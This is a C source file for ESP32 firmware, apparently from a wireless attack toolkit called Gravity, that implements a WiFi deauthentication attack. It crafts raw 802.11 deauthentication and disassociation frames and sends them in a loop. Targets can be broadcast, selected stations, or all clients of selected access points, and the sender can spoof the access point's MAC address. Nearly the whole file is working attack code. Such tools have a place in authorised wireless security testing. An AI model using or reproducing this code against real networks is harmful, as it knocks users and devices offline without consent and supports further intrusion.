#include "deauth.h"
#include "common.h"
#include "esp_err.h"
#include "probe.h"

// ========== DEAUTH PACKET ========== //
uint8_t deauth_pkt[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};
int DEAUTH_DEST_OFFSET = 4;
int DEAUTH_SRC_OFFSET = 10;
int DEAUTH_BSSID_OFFSET = 16;
char *DEAUTH_TAG = "deauth@GRAVITY";

static DeauthMode mode = DEAUTH_MODE_OFF;
static DeauthMAC deauthMAC = DEAUTH_MAC_FRAME;
static long deauth_delay = 0;
static TaskHandle_t deauthTask = NULL;

ScanResultSTA **targetSTA = NULL;
int targetCount = 0;

esp_err_t deauth_standalone_packet(uint8_t *src, uint8_t *dest) {
    uint8_t pkt[26];
    memcpy(pkt, deauth_pkt, 26);
    memcpy(&pkt[4], dest, 6);
    memcpy(&pkt[10], src, 6);
    memcpy(&pkt[16], src, 6);
    return esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), true);
}

esp_err_t disassoc_standalone_packet(uint8_t *src, uint8_t *dest) {
    uint8_t pkt[26];
    memcpy(pkt, deauth_pkt, 26);
    /* Make it a disassociation packet rather than deauthentication */
    memset(pkt, 0xa0, 1);
    memcpy(&pkt[4], dest, 6);
    memcpy(&pkt[10], src, 6);
    memcpy(&pkt[16], src, 6);
    return esp_wifi_80211_tx(ESP_IF_WIFI_AP, pkt, sizeof(pkt), true);
}

void deauthLoop(void *pvParameter) {
    while (true) {
        /* Need to delay at least one tick to satisfy the watchdog */
        vTaskDelay((deauth_delay / portTICK_PERIOD_MS) + 1); /* Delay <delay>ms plus a smidge */

        switch (mode) {
            case DEAUTH_MODE_BROADCAST:
                /* Put a single object in targetSTA representing broadcast */
                targetSTA = malloc(sizeof(ScanResultSTA *));
                if (targetSTA == NULL) {
                    ESP_LOGE(DEAUTH_TAG, "Failed to allocate memory to model a broadcast station");
                    continue;
                }
                targetSTA[0] = malloc(sizeof(ScanResultSTA));
                if (targetSTA[0] == NULL) {
                    ESP_LOGE(DEAUTH_TAG, "Failed to allocate memory to hold model broadcast station");
                    continue;
                }
                targetCount = 1;
                // TODO: Channel
                memset(targetSTA[0]->mac, 0xFF, 6);
                strcpy(targetSTA[0]->strMac, "FF:FF:FF:FF:FF:FF");
                /* Use device MAC as srcAddr */
                uint8_t myMac[6];
                ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, myMac));
                memcpy(targetSTA[0]->apMac, myMac, 6);
                break;
            case DEAUTH_MODE_STA:
                /* Use gravity_selected_sta as targetSTA */
                targetSTA = gravity_selected_stas;
                targetCount = gravity_sel_sta_count;
                #ifdef CONFIG_DEBUG_VERBOSE
                    printf("DEAUTH STA mode. targetCount %d", targetCount);
                    for (int z=0; z<targetCount; ++z) {
                        printf(" targetSTA[%d] %02x:%02x:%02x:%02x:%02x:%02x",z,targetSTA[z]->mac[0],targetSTA[z]->mac[1],targetSTA[z]->mac[2],targetSTA[z]->mac[3],targetSTA[z]->mac[4],targetSTA[z]->mac[5]);
                    }
                    printf("\n");
                #endif
                break;
            case DEAUTH_MODE_AP:
                targetSTA = collateClientsOfSelectedAPs(&targetCount);
                #ifdef CONFIG_DEBUG_VERBOSE
                    printf("DEAUTH AP mode. targeting %d STAs of %d APs\n", targetCount, gravity_sel_ap_count);
                #endif
            default:
                /* NOOP */
        }
        uint8_t devMAC[6];

        for (int i = 0; i < targetCount; ++i) {
            // Set MAC as needed
            switch (deauthMAC) {
                case DEAUTH_MAC_FRAME:
                    /* Use targetSTA[i].apMac if it exists - Reject NULL OUI[0] */
                    if (targetSTA[i]->apMac[0] != 0x00) {
                        memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac,  6);
                        memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
                    }
                    break;
                case DEAUTH_MAC_DEVICE:
                    /* Use device MAC (whatever that is right now ... can I get its orig?) */
                    ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, devMAC));
                    memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], devMAC, 6);
                    memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], devMAC, 6);
                    break;
                case DEAUTH_MAC_SPOOF:
                    if (targetSTA[i]->apMac[0] != 0x00) {
                    /* Set device MAC to targetSTA[i].apMac if it exists */
                    #ifdef CONFIG_DEBUG_VERBOSE
                        printf("spoofing, i is %d, mode is %d", i, mode);
                        printf(" STA is %s", targetSTA[i]->strMac);
                        printf(" AP is %p", targetSTA[i]->ap);
                        printf(" AP MAC %02x:%02x:%02x:%02x:%02x:%02x\n",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                    #endif

                        /* Set frame and device MAC */
                        memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac, 6);
                        memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
//                        ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                        if (esp_wifi_set_mac(WIFI_IF_AP, &(targetSTA[i]->apMac[0])) != ESP_OK) {
                            ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                        }
                        vTaskDelay(1);
                    } else {
                        #ifdef CONFIG_DEBUG_VERBOSE
                            printf("No AP info, not changing SRC from %02x:%02x:%02x:%02x:%02x:%02x\n",deauth_pkt[DEAUTH_SRC_OFFSET],deauth_pkt[DEAUTH_SRC_OFFSET+1],deauth_pkt[DEAUTH_SRC_OFFSET+2],deauth_pkt[DEAUTH_SRC_OFFSET+3],deauth_pkt[DEAUTH_SRC_OFFSET+4],deauth_pkt[DEAUTH_SRC_OFFSET+5]);
                        #endif
                    }
                    break;
                default:
                        ESP_LOGE(DEAUTH_TAG, "Invalid MAC action %d", deauthMAC);
            }
            /* Set destination */
            #ifdef CONFIG_DEBUG_VERBOSE
                printf("Destination %s\n",targetSTA[i]->strMac);
            #endif
            memcpy(&deauth_pkt[DEAUTH_DEST_OFFSET], targetSTA[i]->mac, 6);

            // Transmit
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), true);
        }

        // post-loop

        if (mode == DEAUTH_MODE_BROADCAST) {
            free(targetSTA[0]);
        }
        if (mode == DEAUTH_MODE_BROADCAST || mode == DEAUTH_MODE_AP) {
            free(targetSTA);
            targetSTA = NULL;
        }
    }
}

esp_err_t deauth_start(DeauthMode dMode, DeauthMAC setMAC, long millis) {
    if (mode != DEAUTH_MODE_OFF) {
        /* Deauth is already running, stop that one */
        deauth_stop();
    }
    mode = dMode;
    deauthMAC = setMAC;
    /* Set deauth_delay appropriately if it's silly */
    if (millis < CONFIG_MIN_ATTACK_MILLIS) {
        #ifdef CONFIG_FLIPPER
            printf("Deauth delay %ld less than minimum %d. using minimum\n", millis, CONFIG_MIN_ATTACK_MILLIS);
        #else
            ESP_LOGW(DEAUTH_TAG, "Deauth delay %ld is less than the configured minimum delay %d. Using minimum delay.", millis, CONFIG_MIN_ATTACK_MILLIS);
        #endif
        deauth_delay = (long)CONFIG_MIN_ATTACK_MILLIS;
    } else {
        deauth_delay = millis;
    }
    if (mode == DEAUTH_MODE_OFF) {
        return ESP_OK;
    }
    xTaskCreate(&deauthLoop, "deauthLoop", 2048, NULL, 5, &deauthTask);
    return ESP_OK;
}

esp_err_t deauth_stop() {
    if (mode == DEAUTH_MODE_AP && targetSTA != NULL) {
        free(targetSTA);
    }
    if (deauthTask != NULL) {
        vTaskDelete(deauthTask);
        deauthTask = NULL;
        mode = DEAUTH_MODE_OFF;
        attack_status[ATTACK_DEAUTH] = false;
    }

    return ESP_OK;
}

esp_err_t deauth_macSchemeToString(DeauthMAC theMac, char *theString) {
    esp_err_t err = ESP_OK;
    char *tmpStr;
    switch (theMac) {
        case DEAUTH_MAC_FRAME:
            tmpStr = "DEAUTH_MAC_FRAME";
            break;
        case DEAUTH_MAC_DEVICE:
            tmpStr = "DEAUTH_MAC_DEVICE";
            break;
        case DEAUTH_MAC_SPOOF:
            tmpStr = "DEAUTH_MAC_SPOOF";
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Invalid Deauth MAC Scheme (%d)\n", theMac);
            #else
                ESP_LOGE(DEAUTH_TAG, "Invalid Deauth MAC Scheme specified (%d)", theMac);
            #endif
            return ESP_ERR_INVALID_ARG;
    }
    strcpy(theString, tmpStr);
    return err;
}

esp_err_t deauth_modeToString(DeauthMode theMode, char *theString) {
    esp_err_t err = ESP_OK;
    char *tmpStr;

    switch (theMode) {
        case DEAUTH_MODE_OFF:
            tmpStr = "Off";
            break;
        case DEAUTH_MODE_AP:
            tmpStr = "Clients of Selected APs";
            break;
        case DEAUTH_MODE_STA:
            tmpStr = "Selected STAs";
            break;
        case DEAUTH_MODE_BROADCAST:
            tmpStr = "Broadcast Packets";
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Invalid Deauth Mode %d\n", theMode);
            #else
                ESP_LOGE(DEAUTH_TAG, "Invalid Deauth Mode %d", theMode);
            #endif
            return ESP_ERR_INVALID_ARG;
    }
    strcpy(theString, tmpStr);
    return err;
}

/* Display deauth state, pause interval, mode and MAC approach */
esp_err_t display_deauth_status() {
    esp_err_t err = ESP_OK;
    char modeStr[24] = "";
    char macStr[MAC_STRLEN + 1] = "";

    err |= deauth_modeToString(mode, modeStr);
    err |= deauth_macSchemeToString(deauthMAC, macStr);

    #ifdef CONFIG_FLIPPER
        printf("Deauth: %s\nDeauth Delay: %ldms\nMAC Scheme: %s\nDeauth Targets: %s\n", attack_status[ATTACK_DEAUTH]?"ON":"OFF", deauth_delay, macStr, modeStr);
    #else
        ESP_LOGI(DEAUTH_TAG, "Deauth is %sRunning.\t\t\tDeauth delay %ldms\n\t\t\t Deauth MAC Scheme: %s\tDeauth Targets: %s", attack_status[ATTACK_DEAUTH]?"":"Not ", deauth_delay, macStr, modeStr);
    #endif

    #ifdef CONFIG_DEBUG
        if (mode == DEAUTH_MODE_STA) {
            // Print selectedSTA
            gravity_list_sta(gravity_selected_stas, gravity_sel_sta_count, false);
        } else if (mode == DEAUTH_MODE_AP) {
            // Print selectedAP
            gravity_list_ap(gravity_selected_aps, gravity_sel_ap_count, false);
        }
    #endif

    return err;
}

esp_err_t deauth_setDelay(long millis) {
    deauth_delay = millis;
    return ESP_OK;
}

long deauth_getDelay() {
    return deauth_delay;
}
